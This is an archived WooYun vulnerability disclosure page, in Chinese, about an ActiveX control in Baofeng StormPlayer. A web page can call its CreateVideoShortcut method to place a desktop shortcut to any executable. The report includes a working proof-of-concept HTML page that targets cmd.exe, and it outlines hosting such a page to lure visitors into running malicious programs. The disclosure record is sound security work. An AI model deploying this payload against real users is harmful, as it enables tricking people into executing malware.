@@ -1,0 +1,234 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		暴风影音调用自身接口创建任意桌面快捷方式漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		暴风影音调用自身接口创建任意桌面快捷方式漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/摸了你">摸了你</a> 
+</li><li>提交时间：		2013-12-19 11:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-22：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-08：	细节向普通白帽子公开<br/>
+									2014-01-28：	细节向实习白帽子公开<br/>
+									2014-03-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">类似0day里头的activex文件权限漏洞例子，属于可调用自身接口没做安全校验的漏洞。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1、这段时间fuzz 播放器activex,发现baofeng有个有意思的漏洞，今天又下载最新版本测试了下，依然有效<br />
+<br />
+2、用Comraider,fuzz 暴风影音安装目录<br />
+<br />
+有相关异常，但着实没有找到有用信息，准备然后切换到桌面的时候，发下桌面多了几个这样的文件<br />
+<br />
+</p><p class="detail"><a href="../images/19004314a778400d46c13748f19e1474cb75afd2.jpg" target="_blank"><img src="../images/19004314a778400d46c13748f19e1474cb75afd2.jpg" alt="QQ图片20131219002232.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后我看了下Comraider里头相关activex，及相关函数接口，发现<br />
+<br />
+C:\Program Files\Baofeng\StormPlayer\webplayer\PlayerShell.dll 这个activex里头的<br />
+<br />
+</p><pre><code>Function CreateVideoShortcut (<br />
+ 	ByVal title  As String , <br />
+ 	ByVal video_url  As String , <br />
+ 	ByVal img_url  As String <br />
+)  As Boolean</code></pre><p class='detail'><br />
+<br />
+比较可疑，删掉产生的上图3文件，fuzz这个函数，再看看桌面，这3个文件又生成了。<br />
+<br />
+那么我们写个测试页面看看<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;object classid=&#039;clsid:F587310D-5306-494D-87E2-88334B46E781&#039; id=&quot;target&quot;&gt;&lt;/object&gt; <br />
+&lt;script&gt;<br />
+title=&quot;test&quot;;<br />
+video_url=&quot;test&quot;;<br />
+img_url=&quot;test&quot;;<br />
+target.CreateVideoShortcut(title, video_url, img_url);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+用ie 8打开，桌面多了这么一快捷方式<br />
+<br />
+</p><p class="detail"><a href="../images/19004912e328e87bb732545b866a8fd9388c2491.jpg" target="_blank"><img src="../images/19004912e328e87bb732545b866a8fd9388c2491.jpg" alt="QQ图片20131219004754.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2、那么分析下这个函数，和ie显示的东西<br />
+<br />
+猜测这个可能是打开远程包含vedio地址的url,但没有做安全限制，导致它人可调用此接口<br />
+<br />
+修改参数分别进行测试。<br />
+<br />
+将参数video_url修改成&quot;c:\\windows\\system32\\cmd.exe&quot;，发现桌面生成此快捷方式<br />
+<br />
+</p><p class="detail"><a href="../images/190058129842642b82b66cee4eba7669fc0ee5f0.jpg" target="_blank"><img src="../images/190058129842642b82b66cee4eba7669fc0ee5f0.jpg" alt="testsss.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+双击可运行cmd.exe<br />
+<br />
+</p><p class="detail"><a href="../images/19005845f5a79002645af1b5cf842525599f6471.jpg" target="_blank"><img src="../images/19005845f5a79002645af1b5cf842525599f6471.jpg" alt="test2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+3、利用思路<br />
+<br />
+写个poc挂到网上，他人访问，可在桌面生成暴风图标的快捷方式，点击后执行恶意程序。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;object classid=&#039;clsid:F587310D-5306-494D-87E2-88334B46E781&#039; id=&quot;target&quot;&gt;&lt;/object&gt; <br />
+&lt;script&gt;<br />
+title=&quot;test&quot;;<br />
+video_url=&quot;c:\\windows\\system32\\cmd.exe&quot;;<br />
+img_url=&quot;test&quot;;<br />
+target.CreateVideoShortcut(title, video_url, img_url);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+&lt;/code&gt; </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">接口权限~~~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/摸了你" title="摸了你">摸了你</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046402" title="暴风影音调用自身接口创建任意桌面快捷方式漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-12-19 15:06</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您发现并通知漏洞，我们会尽快处理</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46402";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
